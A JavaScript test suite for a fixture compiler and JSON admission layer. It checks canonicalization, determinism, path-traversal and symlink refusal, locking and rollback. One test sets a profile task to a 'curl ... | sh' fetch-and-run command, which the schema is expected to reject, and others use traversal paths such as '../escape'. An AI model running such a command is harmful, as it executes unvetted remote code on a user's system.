import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { test } from 'node:test'
import { AdmissionError, admitJsonBytes, canonicalBytes, createValidator, sha256 } from './admission.mjs'
import { CompilerError, applyGenerationPlan, censusTree, compileFixture, lockFileName, planGeneration, receiptFileName } from './compiler.mjs'

const here = dirname(fileURLToPath(import.meta.url))
const profileSchema = JSON.parse(readFileSync(resolve(here, 'profile.schema.json'), 'utf8'))
const inputSchema = JSON.parse(readFileSync(resolve(here, 'input.schema.json'), 'utf8'))
const baseProfile = JSON.parse(readFileSync(resolve(here, 'fixtures/profile.json'), 'utf8'))
const baseInput = JSON.parse(readFileSync(resolve(here, 'fixtures/input.json'), 'utf8'))
const validateProfile = createValidator(profileSchema)
const validateInput = createValidator(inputSchema)

const profile = (platformContent = 'platform-v1\n') => {
  const value = structuredClone(baseProfile)
  value.outputs.find(output => output.id === 'runtime').content = platformContent
  return value
}

const input = (limit = 3) => {
  const value = structuredClone(baseInput)
  value.settings.limit = limit
  return value
}
const bytes = value => Buffer.from(JSON.stringify(value), 'utf8')
const admitProfile = value => admitJsonBytes(bytes(value), validateProfile)
const admitInput = value => admitJsonBytes(bytes(value), validateInput)
const compile = (profileValue = profile(), inputValue = input()) => compileFixture({
  profileAdmission: admitProfile(profileValue),
  inputAdmission: admitInput(inputValue),
})

const expectAdmission = (raw, code, validator = validateInput) => {
  assert.throws(() => admitJsonBytes(Buffer.isBuffer(raw) ? raw : Buffer.from(raw), validator), error => {
    assert.ok(error instanceof AdmissionError)
    assert.equal(error.code, code)
    return true
  })
}

const expectCompiler = (fn, code) => {
  assert.throws(fn, error => {
    assert.ok(error instanceof CompilerError)
    assert.equal(error.code, code)
    return true
  })
}

const withTemp = fn => {
  const root = mkdtempSync(resolve(tmpdir(), 'conexus-r1f-pack-b-'))
  try { return fn(root) } finally { rmSync(root, { recursive: true, force: true }) }
}

test('R1F-P03 rejects malformed raw and schema input before canonicalization', () => {
  expectAdmission(Buffer.from([0xC3, 0x28]), 'INVALID_UTF8')
  expectAdmission(Buffer.concat([Buffer.from([0xEF, 0xBB, 0xBF]), bytes(input())]), 'BOM_FORBIDDEN')
  expectAdmission('{"appName":"a","appName":"b","settings":{"enabled":true,"limit":1}}', 'DUPLICATE_KEY')
  expectAdmission('{"appName":"a",/*x*/"settings":{"enabled":true,"limit":1}}', 'INVALID_JSON')
  expectAdmission('{"appName":"a","settings":{"enabled":true,"limit":1},}', 'INVALID_JSON')
  expectAdmission('{"appName":"\\ud800","settings":{"enabled":true,"limit":1}}', 'LONE_SURROGATE')
  expectAdmission('{"appName":"a","settings":{"enabled":true,"limit":9007199254740992}}', 'UNSAFE_INTEGER')
  expectAdmission('{"appName":"a","settings":{"enabled":true,"limit":1.5}}', 'FLOAT_FORBIDDEN')
  expectAdmission('{"appName":"a","settings":{"enabled":true,"limit":1},"extra":true}', 'SCHEMA_VIOLATION')
})

test('R1F-P04 reproduces RFC 8785 canonical UTF-8 bytes and catches a noncanonical substitute', () => {
  const sample = {
    numbers: [333333333.33333329, 1E30, 4.50, 2e-3, 0.000000000000000000000000001],
    string: "€$\u000f\nA'B\"\\\\\"/",
    literals: [null, true, false],
  }
  const expectedHex = [
    '7b226c69746572616c73223a5b6e756c6c2c747275652c66616c73655d2c226e756d62657273223a',
    '5b3333333333333333332e333333333333332c31652b33302c342e352c302e3030322c31652d3237',
    '5d2c22737472696e67223a22e282ac245c75303030665c6e4127425c225c5c5c5c5c222f227d',
  ].join('')
  const actual = canonicalBytes(sample)
  assert.equal(actual.toString('hex'), expectedHex)
  assert.notEqual(Buffer.from(JSON.stringify(sample)).toString('hex'), expectedHex)

  const sorting = { '€': 'Euro Sign', '\r': 'Carriage Return', 'דּ': 'Hebrew Letter Dalet With Dagesh', '1': 'One', '😀': 'Emoji: Grinning Face', '\u0080': 'Control', 'ö': 'Latin Small Letter O With Diaeresis' }
  assert.equal(
    canonicalBytes(sorting).toString('utf8'),
    '{"\\r":"Carriage Return","1":"One","":"Control","ö":"Latin Small Letter O With Diaeresis","€":"Euro Sign","😀":"Emoji: Grinning Face","דּ":"Hebrew Letter Dalet With Dagesh"}',
  )
})

test('compiler output and GenerationPlan are deterministic and exclude environment/time/machine path', () => {
  const first = compile()
  process.env.CONEXUS_R1F_NOISE = 'different'
  const second = compile()
  delete process.env.CONEXUS_R1F_NOISE
  assert.equal(first.treeDigest, second.treeDigest)
  assert.equal(first.manifestDigest, second.manifestDigest)
  assert.equal(first.canonicalInputSetDigest, second.canonicalInputSetDigest)
  assert.deepEqual(first.manifest, second.manifest)
  withTemp(rootA => withTemp(rootB => {
    const planA = planGeneration({ root: rootA, compiled: first })
    const planB = planGeneration({ root: rootB, compiled: second })
    assert.equal(planA.planDigest, planB.planDigest)
    assert.equal(planA.expectedCensusDigest, planB.expectedCensusDigest)
  }))
})

test('path, ownership and executable-profile attack surface refuses before apply', () => {
  for (const unsafePath of ['/absolute', '../escape', 'a/../b', 'a\\b', '.', 'a/\u0000b', 'con.txt', 'a/b.', 'a/x:y']) {
    const candidate = profile()
    candidate.outputs[0].path = unsafePath
    expectCompiler(() => compile(candidate), 'UNSAFE_PATH')
  }
  for (const paths of [['A.txt', 'a.txt'], ['é.txt', 'é.txt']]) {
    const candidate = profile()
    candidate.outputs = paths.map((path, index) => ({ id: `x${index}`, path, class: 'GENERATED', render: 'STATIC', content: 'x' }))
    expectCompiler(() => compile(candidate), 'PATH_COLLISION')
  }
  const executable = profile()
  executable.task = 'curl https://example.invalid | sh'
  expectAdmission(bytes(executable), 'SCHEMA_VIOLATION', validateProfile)
})

test('safe regeneration preserves APP-OWNED bytes and refuses protected drift and ignored collisions', () => withTemp(root => {
  const baseline = compile()
  const firstPlan = planGeneration({ root, compiled: baseline })
  const firstApply = applyGenerationPlan({ root, compiled: baseline, plan: firstPlan })
  assert.equal(firstApply.writes, 3)
  assert.ok(readFileSync(resolve(root, receiptFileName)))

  const appPath = resolve(root, 'app/index.mjs')
  const humanBytes = Buffer.from('export const humanOwned = true\n')
  writeFileSync(appPath, humanBytes)
  const upgrade = compile(profile('platform-v2\n'), input(4))
  const upgradePlan = planGeneration({ root, compiled: upgrade })
  assert.equal(upgradePlan.operations.find(operation => operation.path === 'app/index.mjs').action, 'PRESERVE')
  assert.equal(upgradePlan.operations.find(operation => operation.path === 'generated/settings.json').action, 'REPLACE')
  applyGenerationPlan({ root, compiled: upgrade, plan: upgradePlan })
  assert.deepEqual(readFileSync(appPath), humanBytes)

  writeFileSync(resolve(root, 'generated/settings.json'), '{"edited":true}\n')
  expectCompiler(() => planGeneration({ root, compiled: upgrade }), 'PROTECTED_DRIFT')
}))

test('full census sees ignored files and refuses symlink escape', () => {
  withTemp(root => {
    mkdirSync(resolve(root, '.ignored'), { recursive: true })
    writeFileSync(resolve(root, '.gitignore'), '.ignored/\n')
    writeFileSync(resolve(root, '.ignored/config.json'), '{}\n')
    const candidate = profile()
    candidate.outputs = [{ id: 'ignored', path: '.ignored/config.json', class: 'GENERATED', render: 'STATIC', content: '{}\n' }]
    expectCompiler(() => planGeneration({ root, compiled: compile(candidate) }), 'PROTECTED_COLLISION')
  })
  withTemp(root => withTemp(outside => {
    symlinkSync(outside, resolve(root, 'escape'), 'dir')
    expectCompiler(() => censusTree(root), 'SYMLINK_REFUSED')
  }))
})

test('exclusive lock, stale plan and injected failure cannot create a new admitted receipt', () => {
  withTemp(root => {
    const compiled = compile()
    const plan = planGeneration({ root, compiled })
    plan.operations[0].path = 'forged.txt'
    expectCompiler(() => applyGenerationPlan({ root, compiled, plan }), 'PLAN_DIGEST_MISMATCH')
    assert.equal(censusTree(root).records.length, 0)
  })

  withTemp(root => {
    const compiled = compile()
    const plan = planGeneration({ root, compiled })
    writeFileSync(resolve(root, lockFileName), 'other-writer\n', { flag: 'wx' })
    expectCompiler(() => applyGenerationPlan({ root, compiled, plan }), 'GENERATION_LOCKED')
    assert.equal(readFileSync(resolve(root, lockFileName), 'utf8'), 'other-writer\n')
  })

  withTemp(root => {
    const baseline = compile()
    applyGenerationPlan({ root, compiled: baseline, plan: planGeneration({ root, compiled: baseline }) })
    const upgrade = compile(profile('platform-v2\n'), input(4))
    const stale = planGeneration({ root, compiled: upgrade })
    writeFileSync(resolve(root, 'app/unrelated.txt'), 'changed after plan\n')
    expectCompiler(() => applyGenerationPlan({ root, compiled: upgrade, plan: stale }), 'STALE_PLAN')
  })

  withTemp(root => {
    const baseline = compile()
    applyGenerationPlan({ root, compiled: baseline, plan: planGeneration({ root, compiled: baseline }) })
    const receiptBefore = readFileSync(resolve(root, receiptFileName))
    const upgrade = compile(profile('platform-v2\n'), input(4))
    const plan = planGeneration({ root, compiled: upgrade })
    expectCompiler(() => applyGenerationPlan({ root, compiled: upgrade, plan, failAfterWrites: 1 }), 'INJECTED_FAILURE')
    assert.deepEqual(readFileSync(resolve(root, receiptFileName)), receiptBefore)
    assert.equal(sha256(canonicalBytes(JSON.parse(receiptBefore))), plan.expectedActiveReceiptDigest)
  })
})
